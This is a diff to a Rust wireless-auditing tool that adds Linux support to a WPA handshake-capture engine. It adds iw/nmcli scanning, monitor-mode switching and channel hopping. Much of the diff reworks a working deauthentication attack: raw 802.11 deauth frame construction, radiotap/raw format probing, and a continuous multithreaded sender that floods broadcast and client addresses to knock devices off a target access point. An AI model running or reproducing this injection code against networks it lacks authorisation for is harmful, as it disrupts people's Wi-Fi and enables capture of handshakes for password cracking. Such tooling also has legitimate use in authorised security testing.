@@ -8,7 +8,7 @@ use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::process::Command;
 use std::str;
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU8, Ordering};
 use std::sync::{Arc, Mutex};
 use std::thread;
 use std::time::Duration;
@@ -142,6 +142,11 @@ pub fn scan_networks(interface: &str) -> Result<Vec<WifiNetwork>> {
     // Note: We DON'T disconnect WiFi for a simple scan
     // (disconnection is only needed for packet capture to improve reliability)
 
+    // Linux: iw (headless, root) with an nmcli fallback.
+    if cfg!(target_os = "linux") {
+        return scan_networks_linux(interface);
+    }
+
     // MAC OS implementation
     // try to use native airport first, then fallback to swift script if airport is missing
     // Actually, we found airport is missing on this system.
@@ -235,6 +240,9 @@ fn parse_airport_output(output: &str) -> Result<Vec<WifiNetwork>> {
 /// Check if WiFi interface is currently connected to a network
 /// Returns Some(ssid) if connected, None otherwise
 fn check_wifi_connected() -> Option<String> {
+    if cfg!(target_os = "linux") {
+        return check_wifi_connected_linux();
+    }
     use std::process::Command;
 
     eprintln!("[DEBUG] check_wifi_connected() called");
@@ -312,8 +320,11 @@ pub fn wifi_connected_ssid() -> Option<String> {
     check_wifi_connected()
 }
 
-/// Disconnect from WiFi on macOS
+/// Disconnect from WiFi
 pub fn disconnect_wifi() -> Result<()> {
+    if cfg!(target_os = "linux") {
+        return disconnect_wifi_linux();
+    }
     use std::io::Write;
 
     println!("{}", "🔌 Disconnecting from WiFi...");
@@ -360,6 +371,9 @@ pub struct CaptureOptions<'a> {
     /// burst against the current AP and clears the flag. Independent of
     /// `no_deauth` so the user can trigger bursts on demand.
     pub deauth_requested: Option<Arc<AtomicBool>>,
+    /// Optional human-readable progress sink (wired to the GUI activity log).
+    /// Capture/deauth diagnostics go here in addition to stdout.
+    pub log: Option<Arc<dyn Fn(&str) + Send + Sync>>,
 }
 
 /// Capture traffic to a file
@@ -380,6 +394,7 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
     let duration = options.duration;
     let no_deauth = options.no_deauth;
     let deauth_requested = options.deauth_requested.clone();
+    let log = capture_logger(&options.log);
     println!("{}", "📡 Starting packet capture...");
     println!("Interface: {}", interface);
     println!("Output: {}", output_file);
@@ -400,19 +415,11 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
     // macOS packet injection warning
     if !no_deauth {
         println!();
-        println!("{}", "⚠️  macOS LIMITATION:");
-        println!("{}", "   Apple Silicon does NOT support packet injection.");
-        println!("{}", "   Deauth attacks will NOT work on this Mac.");
-        println!("{}", "   ");
-        println!(
-            "{}",
-            "   💡 To capture a handshake, you must MANUALLY reconnect a device:"
-        );
-        println!("{}", "      1. On your phone/laptop, turn WiFi OFF then ON");
-        println!("{}", "      2. Or 'Forget' and reconnect to the network");
+        log("⚠️ macOS LIMITATION: Apple Silicon Macs do not support raw packet injection.");
+        log("💡 If the deauth sender reports TX errors, force the handshake manually: turn the target device's WiFi OFF then ON.");
         println!();
     } else {
-        println!("{}", "ℹ️  Passive capture mode (--no-deauth)");
+        log("ℹ️ Passive capture mode (deauth disabled)");
     }
 
     // ========================================================================
@@ -466,7 +473,7 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
             println!("   (Scanning BEFORE enabling monitor mode)");
 
             // Perform scan while interface is still in managed mode
-            let networks = detect_all_channels_for_ssid(target_ssid);
+            let networks = detect_all_channels_for_ssid(target_ssid, interface);
 
             if networks.is_empty() {
                 println!(
@@ -552,6 +559,11 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
 
     println!("{}", "📡 Opening interface in monitor mode...");
 
+    // Linux: mac80211 wants monitor mode via ip/iw before capture opens —
+    // libpcap's own rfmon is unreliable there. Restored when capture ends.
+    #[cfg(target_os = "linux")]
+    let _linux_monitor_guard = LinuxMonitorGuard::enter(interface, &log);
+
     // Use external running control if provided, otherwise create a new one
     let running = options.running.unwrap_or_else(|| {
         let r = Arc::new(AtomicBool::new(true));
@@ -563,11 +575,12 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
         r
     });
 
-    // Open capture in monitor mode
+    // Open capture in monitor mode (rfmon only on macOS — on Linux the
+    // LinuxMonitorGuard above already switched the interface manually).
     let cap_builder = Capture::from_device(interface)
         .context("Failed to find device")?
         .promisc(true)
-        .rfmon(true); // Critical for monitor mode
+        .rfmon(cfg!(target_os = "macos")); // Critical for monitor mode
 
     let mut cap = cap_builder
         .timeout(100) // 100ms timeout for read
@@ -599,14 +612,20 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
     // Set initial channel
     if !channels_to_scan.is_empty() {
         let initial_ch = channels_to_scan[0];
-        set_channel_macos(interface, initial_ch);
-        println!("📡 Starting on Channel {}", initial_ch);
+        if set_channel_for_os(interface, initial_ch) {
+            println!("📡 Starting on Channel {}", initial_ch);
+        } else {
+            log(&format!(
+                "⚠️ Could not switch to channel {initial_ch} — capturing on the interface's current channel"
+            ));
+        }
     }
 
     // State for deauth attack
     let mut target_bssid: Option<[u8; 6]> = parsed_bssid;
     let mut last_deauth = std::time::Instant::now();
-    // Helper to find BSSID from SSID if needed
+    let mut deauth_tx_dead = false; // Fallback path: stop once TX is known-bad
+                                    // Helper to find BSSID from SSID if needed
     let target_ssid_bytes = ssid.map(|s| s.as_bytes());
 
     // ---- Parallel deauth sender ----
@@ -621,7 +640,12 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
     // handle (common on macOS), we fall back to in-loop bursts below.
     let inject_handle = if !no_deauth {
         match Capture::from_device(interface) {
-            Ok(dev) => dev.promisc(true).rfmon(true).timeout(100).open().ok(),
+            Ok(dev) => dev
+                .promisc(true)
+                .rfmon(cfg!(target_os = "macos"))
+                .timeout(100)
+                .open()
+                .ok(),
             Err(_) => None,
         }
     } else {
@@ -632,43 +656,65 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
         let running_t = running.clone();
         let bssid_t = shared_bssid.clone();
         let clients_t = shared_clients.clone();
+        let log_t = log.clone();
         thread::spawn(move || {
-            println!(
-                "{}",
-                "🚀 Parallel deauth sender started (continuous, as fast as the driver allows)"
-            );
+            log_t("🚀 Parallel deauth sender started (continuous, as fast as the driver allows)");
+            let mut successes: u64 = 0;
+            let mut failures: u64 = 0;
+            let mut first_error: Option<String> = None;
             while running_t.load(Ordering::SeqCst) {
                 let bssid_opt = *bssid_t.lock().unwrap();
-                match bssid_opt {
-                    Some(bssid) => {
-                        let clients = clients_t.lock().unwrap().clone();
-                        // Tight batch: broadcast + every known client, repeated.
-                        for _ in 0..20 {
-                            let _ = send_deauth(
-                                &mut inj,
-                                &bssid,
-                                &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
-                            );
-                            for client in &clients {
-                                let _ = send_deauth(&mut inj, &bssid, client);
+                let Some(bssid) = bssid_opt else {
+                    // Target AP not identified yet — wait for the capture loop.
+                    thread::sleep(Duration::from_millis(100));
+                    continue;
+                };
+
+                let clients = clients_t.lock().unwrap().clone();
+                let broadcast: [u8; 6] = [0xFF; 6];
+                let mut batch_errors: u64 = 0;
+                // Tight batch: broadcast + every known client, repeated.
+                for _ in 0..20 {
+                    for target in std::iter::once(&broadcast).chain(clients.iter()) {
+                        match send_deauth(&mut inj, &bssid, target) {
+                            Ok(()) => successes += 1,
+                            Err(e) => {
+                                failures += 1;
+                                batch_errors += 1;
+                                if first_error.is_none() {
+                                    first_error = Some(e.to_string());
+                                    log_t(&format!("⚠️ Deauth TX error: {e}"));
+                                }
                             }
                         }
-                        // Minimal pause so we don't peg a core or overrun the TX ring.
-                        thread::sleep(Duration::from_millis(1));
                     }
-                    // Target AP not identified yet — wait for the capture loop.
-                    None => thread::sleep(Duration::from_millis(100)),
+                }
+
+                // Diagnose TX health once we have enough samples.
+                if successes == 0 && failures >= 100 {
+                    log_t("❌ Raw Wi-Fi injection is blocked on this Mac — deauth frames cannot be sent.");
+                    log_t("💡 Force the handshake instead: on the target device turn WiFi OFF and ON (or forget/rejoin the network).");
+                    log_t("🛑 Parallel deauth sender stopped");
+                    return;
+                }
+                if successes == 1 && first_error.is_none() {
+                    log_t("✅ Deauth TX is working — jamming the target AP");
+                }
+
+                // Minimal pause so we don't peg a core or overrun the TX ring;
+                // back off a bit when the driver is erroring mid-batch.
+                if batch_errors > 0 {
+                    thread::sleep(Duration::from_millis(50));
+                } else {
+                    thread::sleep(Duration::from_millis(1));
                 }
             }
-            println!("{}", "🛑 Parallel deauth sender stopped");
+            log_t("🛑 Parallel deauth sender stopped");
         });
         true
     } else {
         if !no_deauth {
-            println!(
-                "{}",
-                "⚠️  Could not open a second injection handle; falling back to in-capture deauth bursts."
-            );
+            log("⚠️ Could not open a second injection handle; falling back to in-capture deauth bursts.");
         }
         false
     };
@@ -933,7 +979,11 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
                 channels_to_scan.len()
             );
 
-            set_channel_macos(interface, new_channel);
+            if !set_channel_for_os(interface, new_channel) {
+                log(&format!(
+                    "⚠️ Channel switch to {new_channel} failed — still listening on the previous channel"
+                ));
+            }
             last_channel_switch = std::time::Instant::now();
         }
 
@@ -956,15 +1006,15 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
                 if let Some(flag) = &deauth_requested {
                     flag.store(false, Ordering::SeqCst);
                 }
-            } else if let Some(bssid) = target_bssid {
+            } else if let (Some(bssid), false) = (target_bssid, deauth_tx_dead) {
                 // Fallback (no second handle): in-capture burst every 0.5s.
                 if last_deauth.elapsed() >= Duration::from_millis(500) {
-                    for _ in 0..3 {
-                        let _ =
-                            send_deauth(&mut cap, &bssid, &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
-                        for client in pending_handshakes.keys() {
-                            let _ = send_deauth(&mut cap, &bssid, client);
-                        }
+                    let client_list: Vec<[u8; 6]> = pending_handshakes.keys().copied().collect();
+                    let (_, error) = send_deauth_burst(&mut cap, &bssid, &client_list, 3);
+                    if let Some(err) = error {
+                        deauth_tx_dead = true;
+                        log(&format!("⚠️ Periodic deauth is failing: {err}"));
+                        log("💡 Raw injection appears blocked on this Mac — force the client to reconnect manually (WiFi OFF/ON).");
                     }
                     last_deauth = std::time::Instant::now();
                 }
@@ -978,26 +1028,23 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
                 if flag.swap(false, Ordering::SeqCst) {
                     match target_bssid {
                         Some(bssid) => {
-                            let clients = pending_handshakes.len();
-                            for _ in 0..5 {
-                                let _ = send_deauth(
-                                    &mut cap,
-                                    &bssid,
-                                    &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
-                                );
-                                for client in pending_handshakes.keys() {
-                                    let _ = send_deauth(&mut cap, &bssid, client);
-                                }
+                            let client_list: Vec<[u8; 6]> =
+                                pending_handshakes.keys().copied().collect();
+                            let (sent, error) =
+                                send_deauth_burst(&mut cap, &bssid, &client_list, 5);
+                            let clients = client_list.len();
+                            if let Some(err) = error {
+                                log(&format!("❌ Manual deauth failed: {err}"));
+                                log("💡 Raw injection appears blocked on this Mac — turn the target device's WiFi OFF/ON to force the handshake.");
+                            } else {
+                                log(&format!(
+                                    "📣 Manual deauth burst: {sent} frames to {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} (broadcast + {clients} known client(s))",
+                                    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]
+                                ));
                             }
-                            println!(
-                                "📣 Manual deauth burst sent to {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} (broadcast + {} known client(s))",
-                                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], clients
-                            );
                         }
                         None => {
-                            println!(
-                                "⚠️  Deauth requested, but the target AP has not been identified yet. Keep capturing until the target SSID's beacon is seen."
-                            );
+                            log("⚠️ Deauth requested, but the target AP has not been identified yet. Keep capturing until the target SSID's beacon is seen.");
                         }
                     }
                 }
@@ -1138,21 +1185,57 @@ fn parse_bssid_and_ssid_from_packet(data: &[u8]) -> Option<([u8; 6], String)> {
     None
 }
 
-/// Construct and send a Deauth frame
-fn send_deauth(cap: &mut Capture<pcap::Active>, bssid: &[u8; 6], target: &[u8; 6]) -> Result<()> {
-    // 802.11 Deauthentication Frame
-    // 26 bytes header
-    // Reason Code (2 bytes)
+/// Which link-layer encapsulation this platform expects on TX.
+/// 0 = not probed yet, 1 = raw 802.11 (macOS BPF), 2 = radiotap + 802.11 (Linux).
+static TX_FRAME_FORMAT: AtomicU8 = AtomicU8::new(0);
 
+/// Build the progress logger for a capture run: lines always go to stdout and,
+/// when a sink is provided, also to the GUI activity log.
+fn capture_logger(
+    sink: &Option<Arc<dyn Fn(&str) + Send + Sync>>,
+) -> Arc<dyn Fn(&str) + Send + Sync> {
+    match sink {
+        Some(f) => f.clone(),
+        None => Arc::new(|_: &str| {}),
+    }
+}
+
+/// Send one deauth burst (broadcast + known clients, repeated) and report
+/// `(frames_sent, first_error)`.
+fn send_deauth_burst(
+    cap: &mut Capture<pcap::Active>,
+    bssid: &[u8; 6],
+    clients: &[[u8; 6]],
+    repeats: usize,
+) -> (usize, Option<String>) {
+    let mut sent = 0;
+    let mut error: Option<String> = None;
+    let broadcast: [u8; 6] = [0xFF; 6];
+    for _ in 0..repeats {
+        for target in std::iter::once(&broadcast).chain(clients.iter()) {
+            match send_deauth(cap, bssid, target) {
+                Ok(()) => sent += 1,
+                Err(e) => {
+                    if error.is_none() {
+                        error = Some(e.to_string());
+                    }
+                }
+            }
+        }
+    }
+    (sent, error)
+}
+
+/// Build a raw 802.11 deauthentication frame (26-byte header + reason code).
+fn build_deauth_frame(bssid: &[u8; 6], target: &[u8; 6]) -> Vec<u8> {
     let mut frame = Vec::with_capacity(26 + 2);
 
-    // Frame Control: Type 0 (Mgmt), Subtype 12 (0xC - Deauth)
-    // 0xC0 (Subtype C, Type 0. Bits: 00 1100 00) -> 1100 0000 = 0xC0
+    // Frame Control: Type 0 (Mgmt), Subtype 12 (Deauth) -> 0xC0
     frame.push(0xC0);
     frame.push(0x00); // Flags
 
     // Duration
-    frame.extend_from_slice(&[0x00, 0x01]); // Short duration
+    frame.extend_from_slice(&[0x00, 0x01]);
 
     // Addr1: Destination
     frame.extend_from_slice(target);
@@ -1166,29 +1249,56 @@ fn send_deauth(cap: &mut Capture<pcap::Active>, bssid: &[u8; 6], target: &[u8; 6
     // Sequence Control (Fragment 0, Seq 0)
     frame.extend_from_slice(&[0x00, 0x00]);
 
-    // Frame Body:
     // Reason Code: 7 (Class 3 frame received from nonassociated STA)
-    // 0x0007 (Little Endian? No, Management fields are usually LE)
     frame.extend_from_slice(&[0x07, 0x00]);
 
-    // Note: We are sending a "Raw 802.11" frame.
-    // However, the interface might expect a Radiotap header if it's in monitor mode!
-    // Most drivers in monitor mode expect Radiotap + 802.11.
-    // Let's prepend a minimal Radiotap header.
+    frame
+}
 
-    let mut packet = Vec::new();
-
-    // Minimal Radiotap Header
-    // Version 0, Pad 0, Len 8, Present 0 (No fields)
+/// Minimal Radiotap header (version 0, no present fields).
+fn prepend_radiotap(frame: &[u8]) -> Vec<u8> {
+    let mut packet = Vec::with_capacity(8 + frame.len());
     packet.extend_from_slice(&[0x00, 0x00]); // Version/Pad
-    packet.extend_from_slice(&[0x08, 0x00]); // Length 8
-    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Present flags (None)
+    packet.extend_from_slice(&[(8u8), 0x00]); // Length 8
+    packet.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Present flags (none)
+    packet.extend_from_slice(frame);
+    packet
+}
 
-    packet.extend_from_slice(&frame);
+/// Construct and send a Deauth frame.
+///
+/// macOS BPF writes transmit the buffer verbatim, so the frame must be the
+/// raw 802.11 MAC frame there; Linux monitor interfaces usually expect a
+/// radiotap header instead. The working format is probed once and memoized.
+fn send_deauth(cap: &mut Capture<pcap::Active>, bssid: &[u8; 6], target: &[u8; 6]) -> Result<()> {
+    let frame = build_deauth_frame(bssid, target);
+    let format = TX_FRAME_FORMAT.load(Ordering::Relaxed);
 
-    match cap.sendpacket(packet) {
-        Ok(_) => Ok(()),
-        Err(e) => Err(anyhow!("Send error: {}", e)),
+    if format == 1 {
+        cap.sendpacket(frame)
+            .map_err(|e| anyhow!("send error (raw 802.11): {}", e))
+    } else if format == 2 {
+        cap.sendpacket(prepend_radiotap(&frame))
+            .map_err(|e| anyhow!("send error (radiotap): {}", e))
+    } else {
+        // Probe: raw first (macOS), then radiotap (Linux convention).
+        match cap.sendpacket(frame.clone()) {
+            Ok(()) => {
+                TX_FRAME_FORMAT.store(1, Ordering::Relaxed);
+                Ok(())
+            }
+            Err(raw_err) => match cap.sendpacket(prepend_radiotap(&frame)) {
+                Ok(()) => {
+                    TX_FRAME_FORMAT.store(2, Ordering::Relaxed);
+                    Ok(())
+                }
+                Err(radiotap_err) => Err(anyhow!(
+                    "send error (raw: {}; radiotap: {})",
+                    raw_err,
+                    radiotap_err
+                )),
+            },
+        }
     }
 }
 
@@ -1218,13 +1328,19 @@ impl WifiBand {
 }
 
 /// Detect ALL channels for a given SSID (supports Smart Connect multi-BSSID)
-fn detect_all_channels_for_ssid(ssid: &str) -> Vec<NetworkInfo> {
+fn detect_all_channels_for_ssid(ssid: &str, interface: &str) -> Vec<NetworkInfo> {
     use std::process::Command;
 
     println!("🔍 Scanning for SSID: '{}'", ssid);
 
-    // Use Swift scanner
-    if let Ok(networks) = scan_networks_swift() {
+    // Platform-aware scan (CoreWLAN on macOS, iw/nmcli on Linux). Raw
+    // results — no duplicate compacting, so multi-channel APs are kept.
+    let scan_result = if cfg!(target_os = "linux") {
+        scan_networks_linux(interface)
+    } else {
+        scan_networks_swift()
+    };
+    if let Ok(networks) = scan_result {
         let mut results = Vec::new();
         for net in networks {
             if net.ssid == ssid {
@@ -1240,7 +1356,7 @@ fn detect_all_channels_for_ssid(ssid: &str) -> Vec<NetworkInfo> {
             }
         }
 
-        // Return results found by swift
+        // Return results found by the platform scanner
         if !results.is_empty() {
             // Sort by RSSI
             results.sort_by_key(|net| std::cmp::Reverse(net.rssi));
@@ -1570,7 +1686,7 @@ pub fn scan_pcap(interface: &str) -> Result<Vec<WifiNetwork>> {
         }
 
         // Set channel BEFORE opening capture on first iteration, or between reads
-        set_channel_macos(interface, *channel);
+        let _ = set_channel_for_os(interface, *channel);
 
         // Give the hardware time to switch channels
         std::thread::sleep(Duration::from_millis(50));
@@ -1677,16 +1793,336 @@ if let interface = client.interface() {{
     }
 }
 
-/// Set channel on macOS using Swift or airport utility
-fn set_channel_macos(_interface: &str, channel: u32) {
+/// Set channel on macOS using Swift or airport utility. Returns success.
+fn set_channel_macos(_interface: &str, channel: u32) -> bool {
     // Try Swift first (modern macOS)
     if set_channel_swift(channel).is_ok() {
-        return;
+        return true;
     }
 
     if let Some(airport_path) = find_airport_path() {
-        let _ = Command::new(airport_path)
+        return Command::new(airport_path)
             .arg(format!("--channel={}", channel))
-            .output();
+            .output()
+            .map(|o| o.status.success())
+            .unwrap_or(false);
+    }
+
+    false
+}
+
+// ============================================================================
+// Linux platform support (iw / nmcli / ip)
+//
+// The helpers below are plain `Command` wrappers, so they compile everywhere
+// and are only invoked through `cfg!(target_os = "linux")` branches.
+// ============================================================================
+
+/// Scan via `iw dev <iface> scan`, falling back to `nmcli` (NetworkManager).
+fn scan_networks_linux(interface: &str) -> Result<Vec<WifiNetwork>> {
+    // Preferred: iw (works headless, needs root).
+    if let Ok(output) = Command::new("iw").args(["dev", interface, "scan"]).output() {
+        if output.status.success() {
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            let networks = parse_iw_scan(&stdout);
+            if !networks.is_empty() {
+                return Ok(networks);
+            }
+        }
+    }
+
+    // Fallback: nmcli (no root needed, requires NetworkManager).
+    if let Ok(output) = Command::new("nmcli")
+        .args([
+            "-t",
+            "-f",
+            "SSID,BSSID,CHAN,SIGNAL,SECURITY",
+            "device",
+            "wifi",
+            "list",
+        ])
+        .output()
+    {
+        if output.status.success() {
+            let stdout = String::from_utf8_lossy(&output.stdout);
+            let networks = parse_nmcli_scan(&stdout);
+            if !networks.is_empty() {
+                return Ok(networks);
+            }
+        }
+    }
+
+    Err(anyhow!(
+        "no networks found via iw/nmcli — is 'iw' installed and are you running with sudo?"
+    ))
+}
+
+/// Parse `iw dev <iface> scan` output into networks.
+fn parse_iw_scan(output: &str) -> Vec<WifiNetwork> {
+    let mut networks = Vec::new();
+
+    struct Partial {
+        bssid: String,
+        ssid: Option<String>,
+        channel: Option<u32>,
+        signal: Option<String>,
+        rsn: bool,
+        wpa: bool,
+        privacy: bool,
+    }
+    impl Partial {
+        fn finish(self) -> WifiNetwork {
+            WifiNetwork {
+                ssid: match self.ssid {
+                    Some(s) if !s.is_empty() => s,
+                    _ => "<Hidden>".to_string(),
+                },
+                bssid: self.bssid,
+                channel: self.channel.unwrap_or(0).to_string(),
+                signal_strength: self.signal.unwrap_or_else(|| "-100".to_string()),
+                security: linux_security_string(self.rsn, self.wpa, self.privacy),
+            }
+        }
+    }
+
+    let mut current: Option<Partial> = None;
+    for line in output.lines() {
+        if let Some(rest) = line.strip_prefix("BSS ") {
+            if let Some(done) = current.take() {
+                networks.push(done.finish());
+            }
+            let bssid = rest.split('(').next().unwrap_or("").trim().to_string();
+            current = Some(Partial {
+                bssid,
+                ssid: None,
+                channel: None,
+                signal: None,
+                rsn: false,
+                wpa: false,
+                privacy: false,
+            });
+            continue;
+        }
+
+        let Some(part) = current.as_mut() else {
+            continue;
+        };
+        let trimmed = line.trim();
+        if let Some(value) = trimmed.strip_prefix("freq:") {
+            if let Ok(freq) = value.trim().parse::<u32>() {
+                part.channel = freq_to_channel(freq);
+            }
+        } else if let Some(value) = trimmed.strip_prefix("signal:") {
+            // "-61.00 dBm" → "-61"
+            if let Some(dbm) = value.split_whitespace().next() {
+                part.signal = Some(dbm.split('.').next().unwrap_or(dbm).to_string());
+            }
+        } else if let Some(value) = trimmed.strip_prefix("SSID:") {
+            part.ssid = Some(value.trim().to_string());
+        } else if let Some(value) = trimmed.strip_prefix("DS Parameter set: channel") {
+            if let Ok(ch) = value.trim().parse::<u32>() {
+                part.channel = Some(ch);
+            }
+        } else if trimmed.starts_with("RSN") {
+            part.rsn = true;
+        } else if trimmed.starts_with("WPA") {
+            part.wpa = true;
+        } else if trimmed.starts_with("capability:") && trimmed.contains("Privacy") {
+            part.privacy = true;
+        }
+    }
+    if let Some(done) = current.take() {
+        networks.push(done.finish());
+    }
+
+    networks
+}
+
+/// Parse `nmcli -t` (terse, `:`-separated with escaped colons) scan output.
+fn parse_nmcli_scan(output: &str) -> Vec<WifiNetwork> {
+    let mut networks = Vec::new();
+    for line in output.lines() {
+        let fields = split_nmcli_terse(line);
+        if fields.len() < 5 || (fields[0].is_empty() && fields[1].is_empty()) {
+            continue;
+        }
+        // nmcli reports signal strength 0-100; approximate dBm.
+        let signal_dbm = fields[3]
+            .parse::<i32>()
+            .map(|s| s / 2 - 100)
+            .unwrap_or(-100);
+        networks.push(WifiNetwork {
+            ssid: if fields[0].is_empty() {
+                "<Hidden>".to_string()
+            } else {
+                fields[0].clone()
+            },
+            bssid: fields[1].clone(),
+            channel: fields[2].clone(),
+            signal_strength: signal_dbm.to_string(),
+            security: fields[4].clone(),
+        });
+    }
+    networks
+}
+
+/// Split an nmcli terse line on unescaped ':'.
+fn split_nmcli_terse(line: &str) -> Vec<String> {
+    let mut fields = Vec::new();
+    let mut current = String::new();
+    let mut escaped = false;
+    for ch in line.chars() {
+        match (escaped, ch) {
+            (true, c) => {
+                current.push(c);
+                escaped = false;
+            }
+            (false, '\\') => escaped = true,
+            (false, ':') => fields.push(std::mem::take(&mut current)),
+            (false, c) => current.push(c),
+        }
+    }
+    fields.push(current);
+    fields
+}
+
+fn freq_to_channel(freq: u32) -> Option<u32> {
+    match freq {
+        2412..=2472 => Some((freq - 2407) / 5),
+        2484 => Some(14),
+        5160..=5885 => Some((freq - 5000) / 5),
+        _ => None,
+    }
+}
+
+fn linux_security_string(rsn: bool, wpa: bool, wep_privacy: bool) -> String {
+    match (rsn, wpa) {
+        (true, true) => "WPA/WPA2".to_string(),
+        (true, false) => "WPA2".to_string(),
+        (false, true) => "WPA".to_string(),
+        (false, false) if wep_privacy => "WEP".to_string(),
+        _ => String::new(), // open
+    }
+}
+
+/// Currently associated SSID via `iwgetid`, falling back to nmcli.
+fn check_wifi_connected_linux() -> Option<String> {
+    if let Ok(output) = Command::new("iwgetid").arg("-r").output() {
+        if output.status.success() {
+            let ssid = String::from_utf8_lossy(&output.stdout).trim().to_string();
+            if !ssid.is_empty() {
+                return Some(ssid);
+            }
+        }
+    }
+    if let Ok(output) = Command::new("nmcli")
+        .args(["-t", "-f", "active,ssid", "device", "wifi"])
+        .output()
+    {
+        if output.status.success() {
+            for line in String::from_utf8_lossy(&output.stdout).lines() {
+                if let Some(rest) = line.strip_prefix("yes:") {
+                    let ssid = split_nmcli_terse(rest).join("");
+                    if !ssid.is_empty() {
+                        return Some(ssid);
+                    }
+                }
+            }
+        }
+    }
+    None
+}
+
+/// First wireless interface name from `iw dev`.
+pub(crate) fn first_wireless_interface_linux() -> Option<String> {
+    let output = Command::new("iw").arg("dev").output().ok()?;
+    for line in String::from_utf8_lossy(&output.stdout).lines() {
+        if let Some(name) = line.trim().strip_prefix("Interface ") {
+            return Some(name.to_string());
+        }
+    }
+    None
+}
+
+/// Disconnect Wi-Fi on Linux (nmcli first so it does not auto-rejoin).
+fn disconnect_wifi_linux() -> Result<()> {
+    let interface =
+        first_wireless_interface_linux().ok_or_else(|| anyhow!("no wireless interface found"))?;
+
+    let nmcli_ok = Command::new("nmcli")
+        .args(["device", "disconnect", &interface])
+        .output()
+        .map(|o| o.status.success())
+        .unwrap_or(false);
+    if nmcli_ok {
+        return Ok(());
+    }
+
+    Command::new("iw")
+        .args(["dev", &interface, "disconnect"])
+        .output()
+        .map_err(|e| anyhow!("failed to disconnect {interface}: {e}"))?;
+    Ok(())
+}
+
+/// Set the channel with `iw` (mac80211).
+fn set_channel_linux(interface: &str, channel: u32) -> bool {
+    Command::new("iw")
+        .args(["dev", interface, "set", "channel", &channel.to_string()])
+        .output()
+        .map(|o| o.status.success())
+        .unwrap_or(false)
+}
+
+/// Platform-aware channel switch used by the capture engine.
+fn set_channel_for_os(interface: &str, channel: u32) -> bool {
+    if cfg!(target_os = "linux") {
+        set_channel_linux(interface, channel)
+    } else {
+        set_channel_macos(interface, channel)
+    }
+}
+
+/// RAII guard that switches the interface to monitor mode on Linux via
+/// ip/iw (libpcap's rfmon is unreliable on mac80211) and restores managed
+/// mode when dropped.
+#[cfg(target_os = "linux")]
+struct LinuxMonitorGuard {
+    interface: String,
+}
+
+#[cfg(target_os = "linux")]
+impl LinuxMonitorGuard {
+    fn enter(interface: &str, log: &Arc<dyn Fn(&str) + Send + Sync>) -> Self {
+        let run = |args: &[&str]| -> bool {
+            Command::new(args[0])
+                .args(&args[1..])
+                .output()
+                .map(|o| o.status.success())
+                .unwrap_or(false)
+        };
+        let ok = run(&["ip", "link", "set", "dev", interface, "down"])
+            && run(&["iw", "dev", interface, "set", "type", "monitor"])
+            && run(&["ip", "link", "set", "dev", interface, "up"]);
+        if ok {
+            log("✓ Monitor mode enabled (ip/iw)");
+        } else {
+            log("⚠️ Could not set monitor mode via ip/iw — capture may fail");
+        }
+        Self {
+            interface: interface.to_string(),
+        }
+    }
+}
+
+#[cfg(target_os = "linux")]
+impl Drop for LinuxMonitorGuard {
+    fn drop(&mut self) {
+        let run = |args: &[&str]| {
+            let _ = Command::new(args[0]).args(&args[1..]).output();
+        };
+        run(&["ip", "link", "set", "dev", &self.interface, "down"]);
+        run(&["iw", "dev", &self.interface, "set", "type", "managed"]);
+        run(&["ip", "link", "set", "dev", &self.interface, "up"]);
     }
 }
